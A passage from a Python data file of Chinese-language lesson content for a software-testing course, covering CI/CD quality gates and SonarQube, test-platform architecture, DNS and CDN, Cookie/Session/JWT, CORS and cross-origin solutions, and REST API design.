    - deploy_to_dev.sh
  environment:
    name: development
  only:
    - develop

deploy_staging:
  stage: deploy
  script:
    - deploy_to_staging.sh
  environment:
    name: staging
  only:
    - main
  when: manual  # 手动触发

deploy_prod:
  stage: deploy
  script:
    - deploy_to_prod.sh
  environment:
    name: production
  only:
    - tags  # 只有打tag才部署生产
  when: manual
'''

## 本节小结

选择CI/CD工具的建议：
- **使用GitHub** → GitHub Actions（原生集成）
- **使用GitLab** → GitLab CI（原生集成）
- **需要高度定制** → Jenkins（灵活性最强）
- **混合环境/企业级** → Jenkins + GitLab CI 组合

无论使用哪种工具，核心理念一致：**自动化测试嵌入每次代码变更，质量反馈越快越好**。"""
    },
    {
        "title": "第5节：质量门禁与代码扫描",
        "sort_order": 5,
        "knowledge_point": "质量门禁",
        "time_estimate": 25,
        "content": """## 什么是质量门禁？

质量门禁（Quality Gate）是在CI/CD Pipeline中设置的一系列自动化检查点，代码必须通过这些检查才能进入下一阶段。就像机场安检一样，没过检查就不能登机。

### 质量门禁的核心价值

- **自动化决策**：不依赖人工判断，基于客观指标
- **一致标准**：所有代码都经过相同的质量检查
- **快速反馈**：代码提交后几分钟内就知道质量是否达标
- **防止劣化**：不允许质量低于门禁值的代码进入主干

## SonarQube集成

SonarQube是最流行的代码质量和安全分析平台，支持30+种编程语言。

### SonarQube核心概念

| 概念 | 说明 |
|------|------|
| Quality Gate | 一组条件，定义代码是否通过质量标准 |
| Code Smell | 可维护性问题（不一定是Bug，但应该修复） |
| Bug | 明确的代码错误 |
| Vulnerability | 安全漏洞 |
| Security Hotspot | 需要人工审查的安全敏感代码 |
| Technical Debt | 技术债务（修复所有Code Smell所需时间） |
| Coverage | 代码覆盖率 |

### Quality Gate配置示例

'''
SonarQube默认的"Sonar way" Quality Gate：
✅ 新代码的覆盖率 ≥ 80%
✅ 重复代码行 < 3%
✅ 可维护性评级为 A
✅ 可靠性评级为 A
✅ 安全性评级为 A
✅ 新代码的安全审查通过率为 100%
'''

### Jenkins集成SonarQube

'''groovy
pipeline {
    agent any
    
    stages {
        stage('Code Analysis') {
            steps {
                withSonarQubeEnv('SonarQube') {
                    sh '''
                        sonar-scanner \\
                            -Dsonar.projectKey=myapp \\
                            -Dsonar.sources=src/ \\
                            -Dsonar.tests=tests/ \\
                            -Dsonar.python.coverage.reportPaths=coverage.xml \\
                            -Dsonar.python.xunit.reportPath=junit.xml
                    '''
                }
            }
        }
        
        stage('Quality Gate') {
            steps {
                timeout(time: 5, unit: 'MINUTES') {
                    waitForQualityGate abortPipeline: true
                }
            }
        }
    }
}
'''

### GitLab CI集成SonarQube

'''yaml
sonarqube-check:
  stage: test
  image: sonarsource/sonar-scanner-cli:latest
  variables:
    SONAR_USER_HOME: "${CI_PROJECT_DIR}/.sonar"
  cache:
    key: "${CI_JOB_NAME}"
    paths:
      - .sonar/cache
  script:
    - sonar-scanner
      -Dsonar.projectKey=$CI_PROJECT_NAME
      -Dsonar.sources=.
      -Dsonar.host.url=$SONAR_HOST_URL
      -Dsonar.login=$SONAR_TOKEN
  only:
    - merge_requests
    - main
'''

## 代码覆盖率门禁

### 覆盖率门禁策略

| 门禁级别 | 行覆盖率 | 分支覆盖率 | 适用场景 |
|----------|---------|-----------|----------|
| 严格 | ≥80% | ≥70% | 核心模块、金融系统 |
| 标准 | ≥70% | ≥60% | 一般业务代码 |
| 宽松 | ≥60% | ≥50% | 快速迭代的项目 |
| 无门禁 | 仅报告 | 仅报告 | 遗留代码、迁移期 |

### 在Pipeline中实施覆盖率门禁

'''groovy
// Jenkins 覆盖率门禁示例
stage('Coverage Check') {
    steps {
        sh 'pytest --cov=src --cov-report=xml --cov-report=term'
        
        script {
            def coverage = sh(
                script: "grep 'TOTAL' coverage.txt | awk '{print \$NF}' | sed 's/%//'",
                returnStdout: true
            ).trim().toFloat()
            
            def threshold = 80.0
            
            if (coverage < threshold) {
                error "代码覆盖率 ${coverage}% 低于门禁 ${threshold}%"
            }
            echo "覆盖率 ${coverage}% 达标 ✓"
        }
    }
}
'''

### 覆盖率下降检测

更好的策略是检测"新增代码的覆盖率"而非总体覆盖率：

'''groovy
// 只检测本次变更的代码覆盖率
pipeline {
    stages {
        stage('Incremental Coverage') {
            steps {
                sh 'diff-cover coverage.xml \\
                    --compare-branch=origin/main \\
                    --fail-under=80'
            }
        }
    }
}
'''

**为什么要关注增量覆盖率？**
- 总体覆盖率提升缓慢，新人可能有挫败感
- 增量覆盖率确保每次提交都提高或维持质量
- 不给历史遗留代码"买单"

## 自动化测试通过率门禁

### 分级门禁

| 测试类型 | 通过率门禁 | 失败时行为 |
|----------|-----------|-----------|
| 单元测试 | 100% | 阻止合并 |
| API集成测试 | 100% | 阻止合并 |
| UI冒烟测试 | 100% | 阻止合并 |
| E2E测试（全量） | ≥98% | 标记警告 |
| 性能测试 | P95响应时间达标 | 阻止发布 |

### 实现示例

'''yaml
# GitHub Actions通过率门禁
- name: Run Tests with Threshold
  run: |
    pytest tests/ -v --junitxml=results/junit.xml
    total=$(grep -c 'testcase' results/junit.xml)
    failures=$(grep -c '<failure' results/junit.xml || echo 0)
    pass_rate=$(echo "scale=2; ($total - $failures) / $total * 100" | bc)
    echo "通过率: $pass_rate%"
    
    if (( $(echo "$pass_rate < 100" | bc -l) )); then
      echo "单元测试通过率 $pass_rate% 不满足100%要求"
      exit 1
    fi
'''

## 门禁策略设计

### 分层门禁体系

'''门禁层次：
代码提交（Commit）
  ├── Git Hook：Lint + 格式化
  │   └── ❌ 不通过 → 无法提交
  │
PR/MR阶段
  ├── 自动化代码审查（SonarQube）
  ├── 单元测试覆盖率 ≥ 80%（新代码）
  ├── 安全扫描无高危漏洞
  │   └── ❌ 不通过 → 无法合并
  │
每日构建
  ├── 全量回归测试通过率 ≥ 98%
  ├── 性能基准测试不劣化
  │   └── ❌ 不通过 → 团队通知，优先修复
  │
预发布
  ├── 安全渗透测试无Critical漏洞
  ├── E2E核心流程100%通过
  │   └── ❌ 不通过 → 禁止发布
'''

### 门禁设计原则

1. **分层分级**：不同阶段设置不同的门禁标准
2. **增量优于全量**：更多关注新增代码的质量
3. **可配置豁免**：特殊情况下允许特定角色豁免门禁（但需记录和审视）
4. **可视化**：门禁结果在Merge Request中直接可见（红/绿徽标）
5. **渐进式提升**：门禁阈值可以随着项目成熟逐步提高

### 免检豁免策略

紧急情况下可能需要豁免门禁，但必须有严格的管理：

'''
豁免类型：
1. 紧急热修复（Hotfix）：跳过部分测试，事后补充
2. 配置变更：跳过功能测试
3. 文档变更：跳过所有测试
4. 管理员审批：特定情况下的临时豁免

⚠ 所有豁免必须记录，定期审计
'''

## SonarQube替代方案

| 工具 | 特点 | 适用场景 |
|------|------|----------|
| SonarQube | 最完善，30+语言 | 企业级 |
| CodeClimate | 在线服务，轻量 | 中小团队 |
| Codacy | 自动化代码审查 | 自动化优先 |
| DeepSource | 现代化，AI辅助 | 追求先进 |
| ESLint/Pylint | 语言专用Linter | 必须的基础配置 |

## 本节小结

质量门禁是自动化质量保障的最后一道防线。核心体系：**代码扫描（SonarQube）→ 覆盖率门禁（增量80%+）→ 测试通过率（100%）→ 安全扫描（无高危漏洞）**。门禁不是目的，持续提升代码质量才是。"""
    },
    {
        "title": "第6节：测试平台架构设计",
        "sort_order": 6,
        "knowledge_point": "测试平台架构",
        "time_estimate": 30,
        "content": """## 测试平台的核心模块

一个完整的测试平台通常包含以下核心模块：

### 1. 用例管理模块

管理测试用例的全生命周期。

**功能要点**：
- 用例的创建（手动录入/批量导入/自动生成）
- 用例分类（按模块/标签/优先级）
- 用例版本管理
- 用例评审流程
- 用例与需求的追溯关系

'''python
# 数据模型示例
from sqlalchemy import Column, Integer, String, Text, Enum, DateTime, ForeignKey

class TestCase(Base):
    __tablename__ = 'test_cases'
    
    id = Column(Integer, primary_key=True)
    title = Column(String(200), nullable=False)
    description = Column(Text)
    precondition = Column(Text)
    steps = Column(Text)           # JSON格式存储步骤
    expected_result = Column(Text)
    priority = Column(Enum('P0', 'P1', 'P2', 'P3'))
    status = Column(Enum('draft', 'reviewing', 'approved', 'deprecated'))
    module_id = Column(Integer, ForeignKey('modules.id'))
    created_by = Column(Integer, ForeignKey('users.id'))
    created_at = Column(DateTime)
    updated_at = Column(DateTime)
'''

### 2. 执行引擎

负责用例的调度和执行。

**核心能力**：
- 用例分发（分配到不同的执行器）
- 并行执行控制
- 执行超时管理
- 失败重试机制
- 执行环境切换

**执行引擎架构**：

'''
调度器（Scheduler）
    ↓
任务队列（Redis/MQ）
    ↓
Worker 1        Worker 2        Worker N
(API测试)       (UI测试)       (性能测试)
    ↓               ↓               ↓
结果收集器（Collector）
    ↓
数据库 / 报告中心
'''

'''python
# 执行引擎核心逻辑示例
import asyncio
from concurrent.futures import ThreadPoolExecutor

class TestExecutor:
    def __init__(self, max_workers=10):
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
        self.results = {}
    
    async def execute_plan(self, plan_id):
        cases = await self.load_cases(plan_id)
        tasks = []
        
        for case in cases:
            task = asyncio.get_event_loop().run_in_executor(
                self.executor, self.run_single_case, case
            )
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for case, result in zip(cases, results):
            self.results[case.id] = self.format_result(case, result)
        
        return self.results
    
    def run_single_case(self, case):
        try:
            if case.type == 'api':
                return self.run_api_case(case)
            elif case.type == 'ui':
                return self.run_ui_case(case)
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
'''

### 3. 报告中心

生成和管理测试报告。

**报告类型**：
- **实时报告**：执行过程中实时更新的Dashboard
- **详细报告**：每个用例的执行结果、耗时、日志
- **趋势报告**：通过率/覆盖率/Bug数量的历史趋势图
- **对比报告**：不同版本/不同环境的测试结果对比
- **质量报告**：面向管理层的质量摘要

### 4. 缺陷联动

将测试失败自动与缺陷管理系统对接。

**典型集成**：
- 测试用例失败 → 自动创建JIRA Issue
- 用例重试多次仍失败 → 关联已有Bug或升级优先级
- Bug修复 → 自动触发相关用例的回归测试
- 版本发布 → 关闭所有已验证的Bug

## 前后端分离架构

现代测试平台通常采用前后端分离架构。

### 整体架构图

'''
┌─────────────────────────────────────────────┐
│                 前端（SPA）                   │
│  Vue/React + Ant Design/Element UI          │
│  - 用例管理界面                              │
│  - 测试执行Dashboard                         │
│  - 报告展示                                  │
│  - 测试配置管理                              │
└──────────────┬──────────────────────────────┘
               │ REST API / WebSocket
┌──────────────┴──────────────────────────────┐
│                 后端（API Server）            │
│  FastAPI / Spring Boot / Express            │
│  ┌─────────────────────────────────────┐    │
│  │  业务服务层                          │    │
│  │  - 用例服务   - 执行引擎             │    │
│  │  - 报告服务   - 用户服务             │    │
│  │  - 项目管理   - 通知服务             │    │
│  └─────────────────────────────────────┘    │
└──────────────┬──────────────────────────────┘
               │
┌──────────────┴──────────────────────────────┐
│              基础设施层                       │
│  - PostgreSQL/MySQL（业务数据）              │
│  - Redis（缓存/任务队列）                     │
│  - Celery/Redis Queue（异步任务）             │
│  - MinIO/S3（文件存储）                      │
│  - Docker/K8s（执行器容器化）                 │
└─────────────────────────────────────────────┘
'''

## API设计

### RESTful API规范

'''python
# FastAPI示例：测试用例API
from fastapi import APIRouter, Depends, HTTPException
from typing import List, Optional

router = APIRouter(prefix="/api/v1/cases", tags=["测试用例"])

@router.get("/")
async def list_cases(
    module_id: Optional[int] = None,
    priority: Optional[str] = None,
    status: Optional[str] = None,
    page: int = 1,
    page_size: int = 20,
):
    # 获取用例列表（支持筛选和分页）
    pass

@router.get("/{case_id}")
async def get_case(case_id: int):
    # 获取用例详情
    pass

@router.post("/")
async def create_case(case: CaseCreate):
    # 创建用例
    pass

@router.put("/{case_id}")
async def update_case(case_id: int, case: CaseUpdate):
    # 更新用例
    pass

@router.delete("/{case_id}")
async def delete_case(case_id: int):
    # 删除用例
    pass

@router.post("/batch")
async def batch_create_cases(cases: List[CaseCreate]):
    # 批量创建用例
    pass

@router.post("/{case_id}/execute")
async def execute_single_case(case_id: int, env: str = "test"):
    # 执行单个用例
    pass
'''

### API设计原则

1. **统一命名**：资源名用复数名词（`/cases`、`/plans`）
2. **版本管理**：URL中包含版本号（`/api/v1/`）
3. **分页规范**：`?page=1&page_size=20` 返回 `{items, total, page, page_size}`
4. **统一错误格式**：
'''json
{
  "error": {
    "code": "CASE_NOT_FOUND",
    "message": "用例不存在",
    "details": {"case_id": 999}
  }
}
'''
5. **合理使用HTTP状态码**：201 Created、204 No Content、404 Not Found等

## 测试平台技术选型建议

| 层 | 推荐方案 | 备选方案 |
|---|---------|---------|
| 前端 | Vue3 + Element Plus | React + Ant Design |
| 后端 | Python FastAPI | Go Gin / Java Spring Boot |
| 数据库 | PostgreSQL | MySQL |
| 缓存 | Redis | — |
| 任务队列 | Celery + Redis | RabbitMQ / Kafka |
| 文件存储 | MinIO | AWS S3 / 阿里云OSS |
| 容器化 | Docker + K8s | Docker Compose（小团队） |

## 本节小结

测试平台的核心四模块：**用例管理、执行引擎、报告中心、缺陷联动**。架构上推荐前后端分离（Vue/FastAPI），数据库用PostgreSQL，任务队列用Celery+Redis。好的平台要在灵活性和易用性之间取得平衡——既要支持复杂的测试场景，也要让新手测试人员能快速上手。"""
    },
]

# ============================================================
# 路径5: 加深"计算机基础与网络知识" - 新增4节
# ============================================================
LESSON_CONTENT["计算机基础与网络知识"] = [
    {
        "title": "第3节：DNS解析过程与CDN原理",
        "sort_order": 3,
        "knowledge_point": "DNS与CDN",
        "time_estimate": 25,
        "content": """## DNS是什么？

DNS（Domain Name System，域名系统）是互联网的"电话簿"。它将人类可读的域名（如 `www.example.com`）转换为机器可读的IP地址（如 `93.184.216.34`）。

没有DNS，我们每次访问网站都需要记住一串数字——就像没有通讯录时需要记住每个人的电话号码一样。

## DNS的层次结构

DNS采用**树状层次结构**，自顶向下依次为：

'''
                  [根DNS服务器]  ← 全球13组（a.root-servers.net ~ m.root-servers.net）
                       |
        ┌──────────────┼──────────────┐
        ↓              ↓              ↓
    [.com]          [.org]          [.cn]
    (顶级域)        (顶级域)        (顶级域)
        |
        ↓
    [example.com]     ← 二级域（权威DNS）
        |
        ↓
    [www.example.com] ← 具体的记录
'''

**各级DNS服务器**：
- **根DNS服务器**：全球13组（实际通过Anycast有数百个节点），由ICANN管理
- **顶级域（TLD）服务器**：如 .com、.org、.cn、.io
- **权威DNS服务器**：存放具体域名的解析记录（如example.com的IP）
- **递归DNS服务器**：替用户"跑腿"完成整个查询过程（如8.8.8.8、114.114.114.114）

## 域名解析完整流程

当你在浏览器输入 `www.example.com` 时：

'''
步骤1: 浏览器检查本地缓存
  └→ 有记录? → 直接使用 → 完成!
  └→ 没记录? ↓

步骤2: 检查操作系统缓存（hosts文件）
  └→ 有记录? → 使用 → 完成!
  └→ 没记录? ↓

步骤3: 向递归DNS服务器发起查询（如8.8.8.8）
  └→ 递归服务器检查自身缓存
      └→ 有? → 返回 → 完成!
      └→ 没? ↓

步骤4: 递归服务器向根DNS服务器查询
  → "www.example.com在哪?"
  → 根回复："我不知道具体IP，但.com的服务器在 192.5.6.30"

步骤5: 递归服务器向.com TLD服务器查询
  → "www.example.com在哪?"
  → TLD回复："去问 example.com 的权威DNS（ns1.example.com）"

步骤6: 递归服务器向权威DNS服务器查询
  → "www.example.com的IP是?"
  → 权威DNS回复："93.184.216.34"

步骤7: 递归服务器返回结果给客户端
  → 同时缓存这个结果（根据TTL决定缓存多久）

步骤8: 浏览器用IP地址连接服务器
  → 发起HTTP请求
'''

这个过程通常在几十到几百毫秒内完成！

## dig/nslookup 使用

### dig（DNS诊断神器）

'''bash
# 基本查询
dig www.example.com

# 只看答案部分
dig www.example.com +short
# 输出: 93.184.216.34

# 查询指定DNS服务器
dig @8.8.8.8 www.example.com

# 查询不同类型的记录
dig example.com A        # IPv4地址
dig example.com AAAA     # IPv6地址
dig example.com MX       # 邮件服务器
dig example.com NS       # 权威DNS服务器
dig example.com CNAME    # 别名记录
dig example.com TXT      # 文本记录（SPF/DKIM等）

# 追踪完整解析过程
dig www.example.com +trace

# 反向解析（IP→域名）
dig -x 93.184.216.34
'''

### nslookup

'''bash
# 基本查询
nslookup www.example.com

# 指定DNS服务器
nslookup www.example.com 8.8.8.8

# 查询MX记录
nslookup -type=MX example.com

# 交互模式
nslookup
> server 8.8.8.8
> set type=A
> www.example.com
> exit
'''

### 测试工程师需要知道的DNS场景

测试可能遇到的DNS相关问题：
1. 测试环境域名未配置DNS，需要修改hosts文件
2. 新部署的服务域名解析不到，可能是DNS传播延迟（TTL未过期）
3. CDN缓存导致测试看到的是旧版本内容
4. HTTPS证书的DNS验证

## CDN加速原理

CDN（Content Delivery Network，内容分发网络）是将内容缓存到全球各地的边缘节点，让用户从**地理上最近的节点**获取内容，大幅减少延迟。

### CDN工作流程

'''
用户请求 example.com/image.jpg
        ↓
DNS智能解析（根据用户IP返回最近的CDN节点IP）
        ↓
CDN边缘节点
   ├─ 有缓存? → 直接返回（命中）
   └─ 无缓存? → 回源到源站获取 → 缓存 → 返回
'''

### CDN缓存策略

| 策略 | 说明 | 适用场景 |
|------|------|----------|
| 基于TTL | 设置过期时间（如1小时） | 更新频率固定的资源 |
| 文件哈希 | 文件名含哈希，永久缓存 | 前端构建产物（app.abc123.js） |
| 缓存预热 | 提前将热门资源推送到边缘节点 | 大促活动、新版本发布 |
| 缓存刷新 | 主动清除CDN缓存 | 紧急内容更新 |

### CDN对测试的影响

- **缓存穿透测试**：故意构造CDN不缓存的请求，测试源站性能
- **刷新验证**：确认CDN缓存刷新后用户能看到最新版本
- **区域差异**：不同地区的CDN节点可能表现不同
- **缓存Key设计**：URL参数是否影响缓存Key的生成

## 本节小结

DNS是互联网的基础设施，理解解析流程有助于排查各种"服务调不通"的问题。CDN通过就近接入和缓存策略加速内容分发，测试时需要关注缓存更新和区域一致性。dig和nslookup是排查DNS问题的必备工具。"""
    },
    {
        "title": "第4节：Cookie/Session/Token详解",
        "sort_order": 4,
        "knowledge_point": "Cookie/Session/Token",
        "time_estimate": 25,
        "content": """## 三者的关系

Cookie、Session和Token是Web开发中三种核心的身份认证和状态管理机制。理解它们的区别和联系，是后端测试和接口测试的基础。

**一句话总结**：
- **Cookie**：浏览器端的存储容器
- **Session**：服务器端的用户状态记录
- **Token**：自包含的身份凭证（无需服务器端存储）

## Cookie详解

Cookie是服务器通过HTTP响应头`Set-Cookie`发送给浏览器的小段数据（通常<4KB），浏览器会在后续请求中自动携带。

### Cookie的重要属性

| 属性 | 说明 | 安全影响 |
|------|------|----------|
| Domain | 指定Cookie发送到哪个域名 | 不要设为过于宽泛（如`.com`） |
| Path | 指定Cookie发送到哪个路径 | 默认是设置Cookie的路径 |
| Expires/Max-Age | 过期时间 | 持久Cookie vs 会话Cookie |
| HttpOnly | 禁止JS访问 | 防御XSS窃取Cookie |
| Secure | 仅HTTPS传输 | 防止中间人攻击 |
| SameSite | 跨站请求控制 | 防御CSRF攻击 |

### Cookie实战

'''http
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
Set-Cookie: theme=dark; Path=/; Max-Age=2592000

# 后续请求自动携带
GET /api/profile HTTP/1.1
Cookie: session_id=abc123; theme=dark
'''

'''javascript
// 读取Cookie（仅非HttpOnly的可见）
document.cookie;  // "theme=dark"

// 无法读取HttpOnly的session_id
// document.cookie 中看不到 session_id
'''

## Session原理

Session是**服务器端**维护的用户状态。通常通过Cookie中的session_id关联。

### Session工作流程

'''
1. 用户登录 → 服务器验证凭证
2. 服务器创建Session（存储用户ID、角色等信息），生成session_id
3. 服务器通过Set-Cookie将session_id发给浏览器
4. 后续请求 → 浏览器自动携带session_id Cookie
5. 服务器根据session_id查找Session，获取用户状态
'''

### Session的存储方式

| 存储方式 | 优点 | 缺点 |
|----------|------|------|
| 内存 | 最快 | 服务重启丢失；不支持多实例 |
| Redis | 快速、支持分布式 | 需要额外运维 |
| 数据库 | 持久可靠 | 性能较慢 |
| 文件 | 简单 | 不适合分布式 |

### Session的安全考量

- **Session固定攻击**：攻击者先获取一个session_id，诱骗用户使用此ID登录
- **Session超时**：需要设置合理的过期时间
- **退出登录**：必须销毁服务端Session（不能只清除客户端Cookie）

## JWT（JSON Web Token）详解

JWT是目前最流行的Token认证方案，是**自包含**的——Token本身就包含了用户信息，不需要服务端存储。

### JWT的结构

JWT由三部分组成，用`.`分隔：

'''
Header.Payload.Signature
'''

**1. Header（头部）**：指定算法和类型
'''json
{
  "alg": "HS256",
  "typ": "JWT"
}
'''

**2. Payload（载荷）**：存放声明（Claims）
'''json
{
  "sub": "1234567890",      // 主题（通常是用户ID）
  "name": "张三",
  "role": "admin",
  "iat": 1516239022,        // 签发时间
  "exp": 1516242622         // 过期时间
}
'''

**3. Signature（签名）**：
'''
signature = HMAC-SHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
'''

服务端用相同的密钥验证签名，确保Token未被篡改。

### JWT的使用方式

'''http
# 登录成功，服务器返回JWT
HTTP/1.1 200 OK
{
  "access_token": "eyJhbGciOiJIUzI1NiIs...",
  "token_type": "Bearer",
  "expires_in": 3600
}

# 后续请求，在Authorization头中携带
GET /api/profile HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
'''

### JWT vs Session

| 维度 | JWT | Session |
|------|-----|---------|
| 状态存储 | 客户端（Token自包含） | 服务器端 |
| 扩展性 | 天然支持分布式 | 需要共享Session存储 |
| 服务端开销 | 无存储开销 | 需要维护Session |
| 注销控制 | 困难（Token签发后无法主动失效） | 容易（删Session即可） |
| 安全性 | Payload可被解码查看 | 信息只在服务端 |
| 适合场景 | 微服务、移动App、跨域API | 传统Web应用 |

### JWT的常见问题

**1. JWT无法主动失效**：
Token签发后到过期前一直有效。解决方案：
- 使用较短的有效期（如15分钟）+ Refresh Token
- 维护Token黑名单（失去了无状态优势）

**2. JWT体积较大**：
每次请求都要携带，增加带宽消耗。Payload不要放太多数据。

**3. 敏感信息不要放Payload**：
JWT的Payload只是Base64编码，不是加密！任何人都能解码查看。

## 测试工程师需要关注的点

- **Cookie属性验证**：测试Cookie是否设置了HttpOnly/Secure/SameSite
- **Session超时测试**：验证超时时间是否符合需求
- **JWT过期处理**：Token过期后是否有合理的刷新机制
- **注销后Token有效性**：退出登录后，已签发的JWT是否还能使用
- **跨域场景下的Cookie**：SameSite属性对跨域请求的影响
- **并发登录**：同一账号多地登录的Session/Tok管理策略

## 本节小结

- **Cookie**是浏览器存储，自动携带
- **Session**是服务端状态，通过Cookie中的session_id关联
- **JWT**是自包含Token，适合分布式系统但无法主动注销

三者不是互斥关系，很多系统同时使用：JWT做认证 + Cookie做会话标识 + Session做服务端状态缓存。"""
    },
    {
        "title": "第5节：跨域问题与解决方案",
        "sort_order": 5,
        "knowledge_point": "跨域问题",
        "time_estimate": 25,
        "content": """## 同源策略

同源策略（Same-Origin Policy）是浏览器最核心的安全机制，它限制了不同源的文档或脚本对彼此的交互。

**什么是"同源"？**
三个条件同时满足才算同源：
- 协议相同（http vs https）
- 域名相同（www.example.com vs api.example.com）
- 端口相同（80 vs 8080）

'''同源 vs 非同源 示例：
https://www.example.com:443
  ✅ 同源: https://www.example.com/user/profile
  ❌ 非同源: http://www.example.com (协议不同)
  ❌ 非同源: https://api.example.com (子域名不同)
  ❌ 非同源: https://www.example.com:8443 (端口不同)
'''

**同源策略限制了什么？**
1. Cookie、LocalStorage、IndexedDB 无法读取
2. DOM 无法获取
3. AJAX 请求无法发送（请求能发出去，但浏览器拦截了响应）

## CORS（跨域资源共享）

CORS（Cross-Origin Resource Sharing）是现代浏览器中最标准的跨域解决方案。它允许服务器通过HTTP响应头声明哪些源可以访问资源。

### 简单请求 vs 预检请求

**简单请求**（满足以下所有条件）：
- 方法：GET、HEAD、POST之一
- 仅包含简单Header（Accept、Accept-Language、Content-Language、Content-Type仅限于以下值）
- Content-Type仅限于：`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`

简单请求流程：
'''
浏览器 → 请求自动添加Origin头 → 服务器检查 →
返回Access-Control-Allow-Origin → 浏览器检查是否匹配 →
允许/拦截
'''

**预检请求（Preflight）**：

不满足简单请求条件的（如使用`application/json`的POST请求、PUT/DELETE方法、自定义Header），浏览器会先发送一个OPTIONS请求来"探路"。

'''
浏览器 → OPTIONS请求（预检）
    Headers: Origin, Access-Control-Request-Method, Access-Control-Request-Headers
服务器 → OPTIONS响应
    Headers: Access-Control-Allow-Origin, Access-Control-Allow-Methods, Access-Control-Allow-Headers
浏览器检查通过 → 发送实际请求
'''

### CORS响应头详解

| 响应头 | 说明 | 示例 |
|--------|------|------|
| Access-Control-Allow-Origin | 允许的源 | `*`（全部）或 `https://example.com` |
| Access-Control-Allow-Methods | 允许的方法 | `GET, POST, PUT, DELETE` |
| Access-Control-Allow-Headers | 允许的自定义头 | `Authorization, X-Custom-Header` |
| Access-Control-Allow-Credentials | 是否允许携带Cookie | `true` |
| Access-Control-Max-Age | 预检缓存时间（秒） | `86400` |

### CORS带Cookie

默认情况下，跨域请求不发送Cookie。需要：

'''http
# 服务器响应头
Access-Control-Allow-Origin: https://example.com  # 不能用 * 
Access-Control-Allow-Credentials: true

# 客户端需要设置
'''

'''javascript
// 前端fetch设置
fetch('https://api.example.com/data', {
  credentials: 'include'  // 携带Cookie
});
'''

## JSONP原理

JSONP（JSON with Padding）是早期的跨域方案，利用`<script>`标签不受同源策略限制的特点。

### 工作原理

'''html
<!-- 1. 客户端动态创建script标签 -->
<script>
function handleResponse(data) {
  console.log(data);  // 获取到跨域数据
}
</script>
<script src="https://api.example.com/data?callback=handleResponse"></script>
'''

<!-- 2. 服务器返回的是JavaScript代码 -->
'''
handleResponse({"name": "张三", "age": 25});
'''

**JSONP的局限**：
- ❌ 只支持GET请求
- ❌ 不能设置自定义Header
- ❌ 没有错误处理机制（script加载失败难以检测）
- ❌ 存在XSS安全风险
- ✅ 兼容性好（老浏览器也可用）

**结论**：现代开发中应使用CORS，JSONP仅在特定兼容场景下使用。

## 代理解决跨域

在开发环境中，常通过前端开发服务器的反向代理解决跨域问题。

### Vue CLI代理配置

'''javascript
// vue.config.js
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: 'https://api.example.com',  // 目标服务器
        changeOrigin: true,                   // 修改请求头的Origin
        pathRewrite: { '^/api': '' }          // 路径重写
      }
    }
  }
};

// 请求 /api/users → 被代理到 https://api.example.com/users
// 对浏览器来说，请求发给了同源服务器，不存在跨域
'''

### Nginx反向代理

'''nginx
# nginx配置
location /api/ {
    proxy_pass https://api.example.com/;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
}
'''

## WebSocket跨域

WebSocket不受同源策略限制（或限制相对宽松）。浏览器会在WebSocket握手时发送Origin头，服务器可以检查Origin决定是否接受连接。

'''javascript
// WebSocket连接可以跨域
const ws = new WebSocket('wss://ws.example.com/socket');
ws.onopen = () => console.log('连接成功');
'''

## 测试中的跨域关注点

1. **CORS配置测试**：验证Access-Control-Allow-Origin是否过于宽松
2. **预检请求测试**：OPTIONS请求是否正确处理
3. **跨域Cookie测试**：credentials模式下Cookie是否正常
4. **HTTP vs HTTPS**：协议不一致导致的跨域
5. **移动端/H5**：WebView中的跨域限制可能不同
6. **错误场景**：CORS不通过时，前端是否有友好的错误提示

## 本节小结

跨域问题的本质是**浏览器的同源安全策略**。主流解决方案：
- **CORS**：标准方案，服务端配置HTTP响应头
- **代理**：开发环境方案，前端DevServer或Nginx反向代理
- **JSONP**：老旧方案，仅支持GET且不安全

推荐：生产环境用CORS，开发环境用代理。"""
    },
    {
        "title": "第6节：REST API设计实战",
        "sort_order": 6,
        "knowledge_point": "REST API设计",
        "time_estimate": 25,
        "content": """## API版本策略

API版本管理是REST API设计中最基础的决策之一。版本策略不当会导致客户端升级困难、不兼容问题频发。

### 常见版本策略

**1. URL路径版本（最常见）**
'''
https://api.example.com/v1/users
https://api.example.com/v2/users
'''

优点：简单直观，易于路由
缺点：URL不够"纯净"

**2. 请求头版本**
'''http
GET /users HTTP/1.1
Accept: application/vnd.example.v2+json
'''

优点：URL干净
缺点：不易测试和调试

**3. 查询参数版本**
'''
https://api.example.com/users?version=2
'''

优点：简单
缺点：容易被忽略，不够RESTful

**推荐**：对于公开API，使用URL路径版本（最直观、最易调试）

## 错误码设计

### 使用标准HTTP状态码

| 状态码 | 场景 | 说明 |
|--------|------|------|
| 200 OK | 成功 | GET/PUT成功 |
| 201 Created | 创建成功 | POST成功创建资源 |
| 204 No Content | 成功但无内容 | DELETE成功后 |
| 400 Bad Request | 客户端错误 | 参数校验失败 |
| 401 Unauthorized | 未认证 | 缺少或无效的Token |
| 403 Forbidden | 无权限 | 已认证但无权访问 |
| 404 Not Found | 不存在 | 资源不存在 |
| 409 Conflict | 冲突 | 并发修改冲突 |
| 422 Unprocessable Entity | 语义错误 | 参数格式正确但语义有误 |
| 429 Too Many Requests | 限流 | 超出请求频率限制 |
| 500 Internal Server Error | 服务器错误 | 未知服务器错误 |

### 统一错误响应体

'''json
{
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "输入参数校验失败",
    "details": [
      {
        "field": "email",
        "message": "邮箱格式不正确"
      },
      {
        "field": "age",
        "message": "年龄必须在0-150之间"
      }
    ],
    "timestamp": "2024-01-15T10:30:00Z",
    "request_id": "req_a8f3b2c1"
  }
}
'''

## 分页与过滤

### 分页设计

'''http
# 请求
GET /api/v1/users?page=2&page_size=20&sort=created_at&order=desc

# 响应
{
  "data": [...],
  "pagination": {
    "page": 2,
    "page_size": 20,
    "total": 150,
    "total_pages": 8,
    "has_next": true,
    "has_prev": true
  }
}
'''

**分页方案对比**：

| 方案 | 说明 | 适合场景 |
|------|------|----------|
